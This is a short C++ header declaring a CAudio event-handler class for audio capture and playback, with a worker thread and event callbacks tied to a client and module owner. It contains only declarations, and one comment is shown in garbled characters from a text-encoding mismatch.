#pragma once
#include "EventHandler.h"
#include "AudioGrab.h"
#include "AudioPlay.h"
#include "audio_common.h"
#include "module.h"



class CAudio :
	public CEventHandler
{
	Module*    m_owner;

	CAudioGrab m_AudioGrab;
	CAudioPlay m_AudioPlay;

	HANDLE	   m_hWorkThread;
	volatile long m_IsWorking;

	void OnAudioBegin();
	void OnAudioStop();
	
	//≤•∑≈…˘“Ù.
	void OnAudioPlayBegin();
	void OnAudioPlayData(BYTE* lpData, DWORD size);
	void OnAudioPlayStop();

	//void OnAudioData();
	static void __stdcall WorkThread(CAudio*pThis);
public:
	CAudio(CClient *pClient,Module * owner);

	static volatile unsigned int nInstance;
	void OnClose();
	void OnOpen();

	void OnEvent(UINT32 e, BYTE* lpData, UINT Size);
	~CAudio();
};

